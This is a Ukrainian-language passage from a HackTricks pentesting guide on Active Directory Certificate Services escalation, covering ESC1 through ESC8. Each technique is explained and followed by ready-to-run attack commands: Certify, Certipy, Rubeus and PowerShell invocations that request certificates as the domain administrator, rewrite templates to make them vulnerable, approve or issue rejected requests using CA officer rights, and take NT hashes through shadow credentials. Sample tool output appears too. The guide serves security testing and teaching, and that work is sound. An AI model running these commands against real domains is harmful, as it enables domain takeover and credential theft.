# Ескалація домену AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Це короткий виклад розділів про техніки ескалації з дописів:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів — ESC1

### Пояснення

### Пояснення щодо неправильно налаштованих шаблонів сертифікатів — ESC1

- **Enterprise CA надає користувачам із низькими привілеями права на реєстрацію.**
- **Погодження менеджера не потрібне.**
- **Підписи уповноважених осіб не потрібні.**
- **Дескриптори безпеки шаблонів сертифікатів мають надто широкі дозволи, що дає змогу користувачам із низькими привілеями отримати права на реєстрацію.**
- **Шаблони сертифікатів налаштовані так, щоб визначати EKU, які дають змогу автентифікуватися:**
  - Включено ідентифікатори Extended Key Usage (EKU), як-от Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) або відсутність EKU (SubCA).
- **Шаблон дозволяє заявникам додавати subjectAltName до запиту на підпис сертифіката (CSR):**
  - Якщо в сертифікаті є subjectAltName (SAN), Active Directory (AD) надає йому пріоритет під час перевірки особи. Це означає, що, вказавши SAN у CSR, можна запросити сертифікат для імітації будь-якого користувача (наприклад, адміністратора домену). Можливість заявника вказати SAN визначається властивістю `mspki-certificate-name-flag` об’єкта шаблону сертифіката в AD. Ця властивість є бітовою маскою, а наявність прапорця `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє заявнику вказати SAN.

> [!CAUTION]
> Ці налаштування вказують на потенційно вразливий шаблон ESC1, але не підтверджують наявність завершеного шляху для імітації особи. Перевірте, чи може цільовий принципал зареєструватися в CA, яка публікує цей шаблон, чи дозволена реєстрація в CA та чи відповідає виданий сертифікат правилам надійного зіставлення SID на кінцевій точці автентифікації. Поточні пропатчені KDC можуть відхилити запитаний UPN, якщо SID у сертифікаті не відповідає цільовому; див. [рекомендації Microsoft щодо зіставлення сертифікатів](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Права на реєстрацію, надані **Domain Computers**, можуть дозволити підготовленій ідентичності комп’ютера реєструватися, навіть якщо початковий користувач цього не може. Оцініть права принципала комп’ютера окремо. Перш ніж надсилати запит, перевірте `msPKI-Minimal-Key-Size`: шаблон, що вимагає ключі RSA довжиною 4096 біт, відхилить стандартний ключ клієнта довжиною 2048 біт. SID цілі, указаний у запиті, може усунути невідповідність SID лише за умови, що CA і KDC приймають отриманий сертифікат і його зіставлення; самі прапорці шаблону чи ACE Enroll цього не підтверджують.

Цю функцію іноді вмикають, щоб забезпечити динамічне створення HTTPS-сертифікатів або сертифікатів вузлів продуктами чи службами розгортання, або через брак розуміння.

Зазначається, що створення сертифіката з цим параметром викликає попередження. Цього не відбувається, коли наявний шаблон сертифіката (наприклад, шаблон `WebServer`, у якому ввімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюють, а потім змінюють, додаючи OID для автентифікації.<sup>[[6]](#references)</sup>

### Зловживання

Щоб **знайти вразливі шаблони сертифікатів**, можна виконати:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Щоб **скористатися цією вразливістю та видати себе за адміністратора**, можна виконати:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Потім можна перетворити згенерований **сертифікат на формат `.pfx`** і знову використати його для **автентифікації за допомогою Rubeus або certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Бінарні файли Windows «Certreq.exe» та «Certutil.exe» можна використати для створення PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перелік шаблонів сертифікатів у схемі конфігурації лісу AD, зокрема тих, для яких не потрібні схвалення чи підписи, які мають EKU Client Authentication або Smart Card Logon і для яких увімкнено прапорець `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна отримати за допомогою такого LDAP-запиту:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Неправильно налаштовані шаблони сертифікатів — ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Enterprise CA надає користувачам із низькими привілеями права на реєстрацію.
2. Вимогу щодо схвалення керівника вимкнено.
3. Вимогу щодо авторизованих підписів не встановлено.
4. Надто дозвільний дескриптор безпеки шаблону сертифіката надає користувачам із низькими привілеями права на реєстрацію сертифікатів.
5. **Шаблон сертифіката визначено так, щоб він містив EKU Any Purpose або не містив EKU.**

**EKU Any Purpose** дає змогу зловмиснику отримати сертифікат **для будь-якої мети**, зокрема для автентифікації клієнта, автентифікації сервера, підписування коду тощо. Для експлуатації цього сценарію можна застосувати ту саму **техніку, що й для ESC3**.

Сертифікати **без EKU**, які діють як сертифікати підпорядкованого CA, можна використовувати **для будь-якої мети**, а також **для підписування нових сертифікатів**. Тож зловмисник може вказувати довільні EKU або поля в нових сертифікатах, використовуючи сертифікат підпорядкованого CA.

Однак нові сертифікати, створені для **автентифікації в домені**, не працюватимуть, якщо підпорядкований CA не є довіреним для об’єкта **`NTAuthCertificates`** — це налаштування за замовчуванням. Попри це, зловмисник усе ще може створювати **нові сертифікати з будь-якими EKU** та довільними значеннями сертифікатів. Потенційно їх можна **використати зі зловмисною метою** в багатьох випадках (наприклад, для підписування коду, автентифікації сервера тощо), що може мати значні наслідки для інших застосунків у мережі, як-от SAML, AD FS або IPSec.<sup>[[6]](#references)</sup>

Щоб перелічити шаблони, які відповідають цьому сценарію в схемі конфігурації лісу AD, можна виконати такий LDAP-запит:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Неправильно налаштовані шаблони Enrollment Agent — ESC3

### Пояснення

Цей сценарій схожий на перший і другий, але **зловживає** **іншим EKU** (Certificate Request Agent) і використовує **2 різні шаблони** (тому має 2 набори вимог).

**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), відомий у документації Microsoft як **Enrollment Agent**, дає принципалу змогу **отримати** **сертифікат** **від імені іншого користувача**.

**«Enrollment agent»** отримує сертифікат за таким **шаблоном** і використовує його, щоб **спільно підписати CSR від імені іншого користувача**. Потім він **надсилає** **спільно підписаний CSR** до CA, отримує сертифікат за **шаблоном**, який **дозволяє «отримання від імені іншого користувача»**, а CA повертає **сертифікат, що належить «іншому» користувачу**.<sup>[[6]](#references)</sup>

**Вимоги 1:**

- Enterprise CA надає користувачам із низькими привілеями права на отримання сертифікатів.
- Вимогу щодо схвалення менеджером не встановлено.
- Вимоги щодо авторизованих підписів немає.
- Дескриптор безпеки шаблону сертифіката надмірно дозвільний і надає користувачам із низькими привілеями права на отримання сертифікатів.
- Шаблон сертифіката містить EKU Certificate Request Agent, що дає змогу запитувати сертифікати за іншими шаблонами від імені інших принципалів.

**Вимоги 2:**

- Enterprise CA надає користувачам із низькими привілеями права на отримання сертифікатів.
- Схвалення менеджером можна обійти.
- Шаблон цільового облікового запису версії 1 може приймати запити від enrollment agent без новіших детальних елементів керування політикою видачі; для версії 2 або новішої перевірте вимоги до політики застосування та авторизованих підписів, а не виключайте шаблон лише через його версію.
- EKU, визначений у шаблоні сертифіката, дозволяє автентифікацію в домені.
- На CA не застосовуються обмеження для enrollment agent.

Цільовий шаблон також має бути опублікований вибраним CA, дозволяти цільовому обліковому запису отримувати сертифікат і підтримувати призначене використання для автентифікації в домені. Перевірте обов’язкові атрибути subject/SAN для цього облікового запису: наприклад, шаблон, який формує subject на основі адреси електронної пошти з AD, не зможе видати сертифікат для облікового запису без потрібного значення `mail`. Самого сертифіката агента недостатньо, щоб виконати ці вимоги цільового шаблону.

### Експлуатація

Для зловживання цим сценарієм можна використати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy):<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Користувачів**, яким дозволено **отримувати** **сертифікат агента реєстрації**, шаблони, у яких агенти реєстрації можуть реєструватися, і **облікові записи**, від імені яких агент реєстрації може діяти, можна обмежити за допомогою корпоративних CA. Для цього відкрийте snap-in `certsrc.msc`, **клацніть правою кнопкою миші CA**, **клацніть «Властивості»**, а потім перейдіть на вкладку «Агенти реєстрації».

Однак зазначено, що **типове** налаштування для CA — «**Не обмежувати агентів реєстрації**». Коли адміністратори вмикають обмеження для агентів реєстрації, обираючи «Обмежити агентів реєстрації», типова конфігурація залишається надзвичайно дозвільною. Вона дозволяє **Everyone** реєструватися в усіх шаблонах від імені будь-кого.

### PoC на PowerShell лише для Windows з Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) використовує ESC1 і ESC2/ESC3 без Certify або Certipy. Його скрипти створюють експортований ключ RSA довжиною 2048 біт за допомогою COM API `X509Enrollment`, формують запит PKCS#10, знаходять перший `pKIEnrollmentService` через LDAP, надсилають його за допомогою `CertificateAuthority.Request`, встановлюють відповідь у `Cert:\CurrentUser\My` і експортують PFX у кодуванні Base64. Скрипт ESC1 додає вибраний зловмисником UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, значення `0xb`), тоді як скрипти ESC2/ESC3 використовують перший сертифікат для підписання запиту PKCS#7 від імені іншого суб’єкта.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Скрипти виводять Base64 **PFX**, що містить приватний ключ, для безпосереднього використання з Rubeus. Не замінюйте його на `[Convert]::ToBase64String($cert.RawData)`: `RawData` кодує лише публічний сертифікат і не може підписати запит PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Вразливий контроль доступу до шаблону сертифіката — ESC4

### **Пояснення**

**Дескриптор безпеки** **шаблонів сертифікатів** визначає **дозволи**, які мають конкретні **суб’єкти AD** щодо шаблону.

Якщо **зловмисник** має необхідні **дозволи**, щоб **змінити** **шаблон** і **впровадити** будь-які **вразливі неправильні конфігурації**, описані в **попередніх розділах**, це може сприяти підвищенню привілеїв.

Важливі дозволи, що застосовуються до шаблонів сертифікатів:<sup>[[6]](#references)</sup>

- **Owner:** Надає неявний контроль над об’єктом, дозволяючи змінювати будь-які атрибути.
- **FullControl:** Надає повні повноваження щодо об’єкта, зокрема можливість змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінити власника об’єкта на суб’єкта, контрольованого зловмисником.
- **WriteDacl:** Дозволяє змінювати списки контролю доступу, потенційно надаючи зловмиснику FullControl.
- **WriteProperty:** Дозволяє редагувати будь-які властивості об’єкта.

Також перевірте DACL контейнера `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Відповідний ACE `CreateChild`, обмежений класом [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), або широкі повні права контролю можуть дозволити створити новий об’єкт шаблону. [Документація Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) зазначає, що цей контейнер містить такі об’єкти шаблонів. Перш ніж визначати, чи можна ефективно створити шаблон, перевірте відповідні ACE заборони та успадкування. Саме створення шаблону не призводить до видачі сертифіката: центр сертифікації має опублікувати шаблон, суб’єкт, який надсилає запит, повинен мати дозвіл на реєстрацію, а сертифікат має зіставлятися з потрібною особою на кінцевій точці автентифікації.

### Зловживання

Щоб виявити суб’єктів із правами редагування шаблонів та інших об’єктів PKI, виконайте перелік за допомогою Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Приклад privesc, подібного до попереднього:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 — це ситуація, коли користувач має права на запис для шаблону сертифіката. Наприклад, цим можна скористатися, щоб перезаписати конфігурацію шаблону сертифіката й зробити його вразливим до ESC1.

Шаблон, який уже дозволяє запитувачу вказати суб’єкта, але має лише призначення Server Authentication, сам по собі не є шаблоном для входу користувачів. Маючи ефективні права керування шаблоном, зловмисник може змінити його автентифікаційні EKU або політики застосунків перед запитом сертифіката; [у документації Microsoft зазначено, що EKU Smartcard Logon призначений для входу](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Переконайтеся, що CA публікує змінений шаблон, запитувач має право на реєстрацію, вимоги щодо схвалення/підпису виконано, а виданий сертифікат зіставляється з потрібним обліковим записом. Зокрема, [контролери домену з виправленнями, що працюють у режимі Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) відхиляють сертифікати без надійного зіставлення; додавання UPN цільового облікового запису до запиту не обходить цю вимогу.

Як видно зі шляху вище, ці права має лише `JOHNPC`, але наш користувач `JOHN` отримав нове ребро `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов’язана із сертифікатами, я також реалізував цю атаку, відому як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ось короткий попередній огляд команди Certipy `shadow auto`, яка отримує NT-хеш жертви.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. **За замовчуванням** Certipy **перезапише** конфігурацію, щоб зробити її **вразливою до ESC1**. Також можна вказати параметр **`-save-old`, щоб зберегти стару конфігурацію**; це стане в пригоді для **відновлення** конфігурації після нашої атаки.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Вразливий контроль доступу до об’єктів PKI — ESC5

### Пояснення

Розгалужена мережа взаємопов’язаних зв’язків на основі ACL, до якої належать кілька об’єктів, окрім шаблонів сертифікатів і центру сертифікації, може впливати на безпеку всієї системи AD CS. До цих об’єктів, які можуть суттєво вплинути на безпеку, належать:

- Об’єкт комп’ютера AD сервера CA, який може бути скомпрометований за допомогою таких механізмів, як S4U2Self або S4U2Proxy.
- RPC/DCOM-сервер сервера CA.
- Будь-який дочірній об’єкт AD або контейнер у межах певного шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях охоплює, зокрема, контейнер шаблонів сертифікатів, контейнер центрів сертифікації, об’єкт NTAuthCertificates і контейнер Enrollment Services.

Безпека системи PKI може бути скомпрометована, якщо зловмисник із низькими привілеями отримає контроль над будь-яким із цих критично важливих компонентів.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 — ESC6

### Пояснення

У дописі [**CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) також розглядаються наслідки використання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, описані Microsoft. Якщо цей параметр увімкнено на центрі сертифікації (CA), він дозволяє додавати **визначені користувачем значення** до **альтернативного імені суб’єкта** для **будь-якого запиту**, зокрема створеного на основі Active Directory®. Унаслідок цього зловмисник може отримати сертифікат за допомогою **будь-якого шаблону**, налаштованого для **автентифікації домену**, зокрема таких, що дають змогу **непривілейованим** користувачам реєструватися за стандартним шаблоном User. Це дозволяє отримати сертифікат і автентифікуватися як адміністратор домену або **будь-який інший активний об’єкт** у домені.<sup>[[9]](#references)</sup>

**Примітка**: Спосіб додавання **альтернативних імен** до запиту на підписання сертифіката (CSR) за допомогою аргументу `-attrib "SAN:"` у `certreq.exe` (так звані «Name Value Pairs») **відрізняється** від способу експлуатації SAN у ESC1. Різниця полягає в тому, **як саме інкапсульовано інформацію про обліковий запис** — в атрибуті сертифіката, а не в розширенні.

### Експлуатація

Щоб перевірити, чи ввімкнено цей параметр, організації можуть скористатися такою командою `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Ця операція по суті використовує **віддалений доступ до реєстру**, тож альтернативний підхід може бути таким:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Такі інструменти, як [**Certify**](https://github.com/GhostPack/Certify) і [**Certipy**](https://github.com/ly4k/Certipy), можуть виявити цю неправильну конфігурацію та експлуатувати її:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Щоб змінити ці параметри, за умови наявності прав **адміністратора домену** або еквівалентних, можна виконати таку команду з будь-якої робочої станції:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Після випуску оновлень безпеки за травень 2022 року нові **сертифікати** міститимуть **розширення безпеки**, яке включає властивість `objectSid` **запитувача**. Для ESC1 цей SID визначається із зазначеного SAN. Однак для **ESC6** SID відповідає **`objectSid` запитувача**, а не SAN.\
> Щоб експлуатувати ESC6, система має бути вразливою до ESC10 (Weak Certificate Mappings), який надає **SAN перевагу над новим розширенням безпеки**.

## Уразливий контроль доступу до центру сертифікації — ESC7

### Атака 1

#### Пояснення

Контроль доступу до центру сертифікації забезпечується набором дозволів, що регулюють дії CA. Переглянути ці дозволи можна, відкривши `certsrv.msc`, клацнувши правою кнопкою миші CA, вибравши властивості, а потім перейшовши на вкладку «Безпека». Крім того, дозволи можна перерахувати за допомогою модуля PSPKI такими командами:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Це дає уявлення про основні права, а саме **`ManageCA`** і **`ManageCertificates`**, що відповідають ролям «адміністратор CA» та «менеджер сертифікатів» відповідно.<sup>[[6]](#references)</sup>

#### Зловживання

Наявність прав **`ManageCA`** на центр сертифікації дає змогу принципалу віддалено змінювати його параметри за допомогою PSPKI. Зокрема, можна ввімкнути прапорець **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, щоб дозволити задавати SAN у будь-якому шаблоні. Це критично важливий аспект підвищення привілеїв у домені.

Цей процес можна спростити за допомогою командлета PSPKI **Enable-PolicyModuleFlag**, який дає змогу вносити зміни без безпосередньої взаємодії з графічним інтерфейсом.

Наявність прав **`ManageCertificates`** дає змогу схвалювати запити, що очікують на розгляд, фактично обходячи захист «схвалення менеджером сертифікатів CA».

За допомогою комбінації модулів **Certify** і **PSPKI** можна надіслати запит на сертифікат, схвалити його та завантажити:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Атака 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** за допомогою дозволів **`Manage CA`** було **ввімкнено** прапорець **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання атаки **ESC6**, але це не матиме жодного ефекту, доки службу CA (`CertSvc`) не буде перезапущено. Коли користувач має право доступу `Manage CA`, йому також дозволено **перезапускати службу**. Однак це **не означає, що користувач може перезапустити службу віддалено**. Крім того, E**SC6 може не працювати одразу після встановлення** в більшості середовищ із виправленнями через оновлення безпеки за травень 2022 року.

Тому тут описано іншу атаку.

Необхідні умови:

- Лише дозвіл **`ManageCA`**
- Дозвіл **`Manage Certificates`** (його можна надати через **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **увімкнений** (його можна ввімкнути через **`ManageCA`**)

Техніка ґрунтується на тому, що користувачі з правами доступу `Manage CA` _і_ `Manage Certificates` можуть **видавати сертифікати за відхиленими запитами**. Шаблон сертифіката **`SubCA`** **вразливий до ESC1**, але **реєструватися в ньому можуть лише адміністратори**. Отже, **користувач** може **подати запит** на реєстрацію в **`SubCA`** — і його буде **відхилено**, — але **згодом керівник видасть сертифікат**.<sup>[[6]](#references)</sup>

#### Експлуатація

Ви можете **надати собі право доступу `Manage Certificates`**, додавши свого користувача як нового відповідального.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Шаблон **`SubCA`** можна **увімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Якщо ми виконали попередні умови для цієї атаки, можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.

**Цей запит буде відхиле**но, але ми збережемо приватний ключ і запишемо ідентифікатор запиту.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Маючи права **`Manage CA` і `Manage Certificates`**, ми можемо **видати сертифікат для невдалої заявки** за допомогою команди `ca` та параметра `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` і параметра `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Зловживання розширенням Manage Certificates (SetExtension)

#### Пояснення

На додаток до класичних зловживань ESC7 (увімкнення атрибутів EDITF або схвалення запитів, що очікують на розгляд), **Certify 2.0** виявив новий примітив, для якого потрібна лише роль *Manage Certificates* (також відома як **Certificate Manager / Officer**) на Enterprise CA.<sup>[[3]](#references)</sup>

Метод RPC `ICertAdmin::SetExtension` може виконати будь-який суб’єкт із правом *Manage Certificates*. Раніше цей метод використовували легітимні CA для оновлення розширень у **запитах, що очікують на розгляд**, але зловмисник може скористатися ним, щоб **додати *нестандартне* розширення сертифіката** (наприклад, власний OID *Certificate Issuance Policy*, такий як `1.1.1.1`), до запиту, що очікує на схвалення.

Оскільки цільовий шаблон **не визначає значення за замовчуванням для цього розширення**, CA НЕ перезапише контрольоване зловмисником значення, коли запит буде видано. Тому отриманий сертифікат міститиме вибране зловмисником розширення, яке може:

* Задовольнити вимоги Application / Issuance Policy інших вразливих шаблонів (що призведе до підвищення привілеїв).
* Додати EKU або політики, які надають сертифікату неочікувану довіру в сторонніх системах.

Коротко кажучи, *Manage Certificates* — раніше вважалося «менш потужною» частиною ESC7 — тепер можна використати для повного підвищення привілеїв або довготривалого закріплення, не змінюючи конфігурацію CA і не потребуючи більш обмеженого права *Manage CA*.

#### Зловживання примітивом за допомогою Certify 2.0

1. **Надішліть запит на сертифікат, який залишиться *pending*.** Це можна забезпечити шаблоном, що вимагає схвалення керівника:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Додайте власне розширення до запиту, що очікує на обробку,** використовуючи нову команду `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Якщо шаблон ще не визначає розширення *Certificate Issuance Policies*, наведене вище значення буде збережено після видачі.*

3. **Надішліть запит** (якщо ваша роль також має права на затвердження *Manage Certificates*) або дочекайтеся, поки оператор його затвердить. Після видачі завантажте сертифікат:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Отриманий сертифікат тепер містить шкідливий OID політики видачі та може використовуватися в подальших атаках (наприклад, ESC13, підвищення привілеїв у домені тощо).

> ПРИМІТКА: ту саму атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` і параметр `-set-extension`.

## NTLM Relay до HTTP-кінцевих точок AD CS – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **встановлено AD CS**, наявність **вразливої кінцевої точки вебреєстрації** та принаймні одного **опублікованого шаблону сертифіката**, який дозволяє **реєстрацію комп’ютерів домену та автентифікацію клієнтів** (наприклад, стандартного шаблону **`Machine`**), дає змогу **зловмиснику скомпрометувати будь-який комп’ютер, на якому активна служба spooler**!

AD CS підтримує кілька **методів реєстрації на основі HTTP**, доступних через додаткові серверні ролі, які можуть встановити адміністратори. Ці інтерфейси реєстрації сертифікатів через HTTP вразливі до **атак NTLM relay**. З **скомпрометованої машини зловмисник може видавати себе за будь-який обліковий запис AD, який автентифікується через вхідний NTLM**. Видаючи себе за обліковий запис жертви, зловмисник може використовувати ці вебінтерфейси, щоб **запросити сертифікат автентифікації клієнта за шаблоном сертифіката `User` або `Machine`**.

